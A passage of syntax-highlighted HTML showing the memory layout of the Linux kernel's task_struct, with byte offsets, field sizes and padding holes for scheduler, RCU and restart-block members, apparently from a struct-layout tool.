</span></span><span class="line"><span class="cl"><span class="cm">/*  688      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">core_cookie</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  696      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">core_occupation</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  704      |     8 */</span>    <span class="k">struct</span> <span class="n">task_group</span> <span class="o">*</span><span class="n">sched_task_group</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  712      |     8 */</span>    <span class="k">struct</span> <span class="n">uclamp_se</span> <span class="n">uclamp_req</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  720      |     8 */</span>    <span class="k">struct</span> <span class="n">uclamp_se</span> <span class="n">uclamp</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 40-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  768      |   256 */</span>    <span class="k">struct</span> <span class="n">sched_statistics</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  768      |     8 */</span>        <span class="n">u64</span> <span class="n">wait_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  776      |     8 */</span>        <span class="n">u64</span> <span class="n">wait_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  784      |     8 */</span>        <span class="n">u64</span> <span class="n">wait_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  792      |     8 */</span>        <span class="n">u64</span> <span class="n">wait_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  800      |     8 */</span>        <span class="n">u64</span> <span class="n">iowait_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  808      |     8 */</span>        <span class="n">u64</span> <span class="n">iowait_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  816      |     8 */</span>        <span class="n">u64</span> <span class="n">sleep_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  824      |     8 */</span>        <span class="n">u64</span> <span class="n">sleep_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  832      |     8 */</span>        <span class="n">s64</span> <span class="n">sum_sleep_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  840      |     8 */</span>        <span class="n">u64</span> <span class="n">block_start</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  848      |     8 */</span>        <span class="n">u64</span> <span class="n">block_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  856      |     8 */</span>        <span class="n">s64</span> <span class="n">sum_block_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  864      |     8 */</span>        <span class="n">u64</span> <span class="n">exec_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  872      |     8 */</span>        <span class="n">u64</span> <span class="n">slice_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  880      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_migrations_cold</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  888      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_failed_migrations_affine</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  896      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_failed_migrations_running</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  904      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_failed_migrations_hot</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  912      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_forced_migrations</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  920      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  928      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_sync</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  936      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_migrate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  944      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_local</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  952      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_remote</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  960      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_affine</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  968      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_affine_attempts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  976      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_passive</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  984      |     8 */</span>        <span class="n">u64</span> <span class="n">nr_wakeups_idle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  992      |     8 */</span>        <span class="n">u64</span> <span class="n">core_forceidle_sum</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 24-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):  256 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">stats</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1024      |     8 */</span>    <span class="k">struct</span> <span class="n">hlist_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1024      |     8 */</span>        <span class="k">struct</span> <span class="n">hlist_node</span> <span class="o">*</span><span class="n">first</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">preempt_notifiers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1032      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">btrace_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1036      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">policy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1040      |     4 */</span>    <span class="kt">int</span> <span class="n">nr_cpus_allowed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1048      |     8 */</span>    <span class="k">const</span> <span class="kt">cpumask_t</span> <span class="o">*</span><span class="n">cpus_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1056      |     8 */</span>    <span class="kt">cpumask_t</span> <span class="o">*</span><span class="n">user_cpus_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 1064      |  1024 */</span>    <span class="kt">cpumask_t</span> <span class="n">cpus_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2088      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">migration_pending</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2096      |     2 */</span>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">migration_disabled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2098      |     2 */</span>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">migration_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2100      |     4 */</span>    <span class="kt">int</span> <span class="n">rcu_read_lock_nesting</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2104      |     4 */</span>    <span class="k">union</span> <span class="n">rcu_special</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>        <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2104      |     1 */</span>            <span class="n">u8</span> <span class="n">blocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2105      |     1 */</span>            <span class="n">u8</span> <span class="n">need_qs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2106      |     1 */</span>            <span class="n">u8</span> <span class="n">exp_hint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2107      |     1 */</span>            <span class="n">u8</span> <span class="n">need_mb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>        <span class="n">u32</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu_read_unlock_special</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2112      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2112      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2120      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu_node_entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2128      |     8 */</span>    <span class="k">struct</span> <span class="n">rcu_node</span> <span class="o">*</span><span class="n">rcu_blocked_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2136      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rcu_tasks_nvcsw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2144      |     1 */</span>    <span class="n">u8</span> <span class="n">rcu_tasks_holdout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2145      |     1 */</span>    <span class="n">u8</span> <span class="n">rcu_tasks_idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  2-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2148      |     4 */</span>    <span class="kt">int</span> <span class="n">rcu_tasks_idle_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2152      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2152      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2160      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu_tasks_holdout_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2168      |     4 */</span>    <span class="kt">int</span> <span class="n">trc_reader_nesting</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2172      |     4 */</span>    <span class="kt">int</span> <span class="n">trc_ipi_to_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2176      |     4 */</span>    <span class="k">union</span> <span class="n">rcu_special</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>        <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2176      |     1 */</span>            <span class="n">u8</span> <span class="n">blocked</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2177      |     1 */</span>            <span class="n">u8</span> <span class="n">need_qs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2178      |     1 */</span>            <span class="n">u8</span> <span class="n">exp_hint</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2179      |     1 */</span>            <span class="n">u8</span> <span class="n">need_mb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>        <span class="n">u32</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">trc_reader_special</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2184      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2184      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2192      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">trc_holdout_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2200      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2200      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2208      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">trc_blkd_node</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2216      |     4 */</span>    <span class="kt">int</span> <span class="n">trc_blkd_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2224      |    32 */</span>    <span class="k">struct</span> <span class="n">sched_info</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2224      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pcount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2232      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">run_delay</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2240      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">last_arrival</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2248      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">last_queued</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">sched_info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2256      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2256      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2264      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">tasks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2272      |    40 */</span>    <span class="k">struct</span> <span class="n">plist_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2272      |     4 */</span>        <span class="kt">int</span> <span class="n">prio</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2280      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2280      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2288      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">prio_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2296      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2296      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2304      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">node_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pushable_tasks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2312      |    24 */</span>    <span class="k">struct</span> <span class="n">rb_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2312      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">__rb_parent_color</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2320      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_right</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2328      |     8 */</span>        <span class="k">struct</span> <span class="n">rb_node</span> <span class="o">*</span><span class="n">rb_left</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pushable_dl_tasks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2336      |     8 */</span>    <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">mm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2344      |     8 */</span>    <span class="k">struct</span> <span class="n">mm_struct</span> <span class="o">*</span><span class="n">active_mm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2352      |     4 */</span>    <span class="kt">int</span> <span class="n">exit_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2356      |     4 */</span>    <span class="kt">int</span> <span class="n">exit_code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2360      |     4 */</span>    <span class="kt">int</span> <span class="n">exit_signal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2364      |     4 */</span>    <span class="kt">int</span> <span class="n">pdeath_signal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2368      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">jobctl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2376      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">personality</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2380: 0   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sched_reset_on_fork</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2380: 1   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sched_contributes_to_load</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2380: 2   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sched_migrated</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  5-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 0   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sched_remote_wakeup</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 1   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_execve</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 2   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_iowait</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 3   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">restore_sigmask</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 4   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_user_fault</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 5   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">no_cgroup_migration</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 6   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">frozen</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2384: 7   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">use_memdelay</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 0   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_memstall</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 1   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_eventfd</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 2   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">pasid_activated</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 3   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">reported_split_lock</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2385: 4   |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_thrashing</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2392      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">atomic_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2400      |    56 */</span>    <span class="k">struct</span> <span class="n">restart_block</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2400      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arch_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2408      |     8 */</span>        <span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span><span class="p">)(</span><span class="k">struct</span> <span class="n">restart_block</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2416      |    40 */</span>        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                40 */</span>            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2416      |     8 */</span>                <span class="n">u32</span> <span class="o">*</span><span class="n">uaddr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2424      |     4 */</span>                <span class="n">u32</span> <span class="n">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2428      |     4 */</span>                <span class="n">u32</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2432      |     4 */</span>                <span class="n">u32</span> <span class="n">bitset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2440      |     8 */</span>                <span class="n">u64</span> <span class="n">time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2448      |     8 */</span>                <span class="n">u32</span> <span class="o">*</span><span class="n">uaddr2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">futex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                24 */</span>            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2416      |     4 */</span>                <span class="kt">clockid_t</span> <span class="n">clockid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2420      |     4 */</span>                <span class="k">enum</span> <span class="n">timespec_type</span> <span class="n">type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2424      |     8 */</span>                <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 8 */</span>                    <span class="k">struct</span> <span class="n">__kernel_timespec</span> <span class="o">*</span><span class="n">rmtp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 8 */</span>                    <span class="k">struct</span> <span class="n">old_timespec32</span> <span class="o">*</span><span class="n">compat_rmtp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                           <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                                       <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 2432      |     8 */</span>                <span class="n">u64</span> <span class="n">expires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">nanosleep</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                32 */</span>            <span class="k">struct</span> <span class="p">{</span>
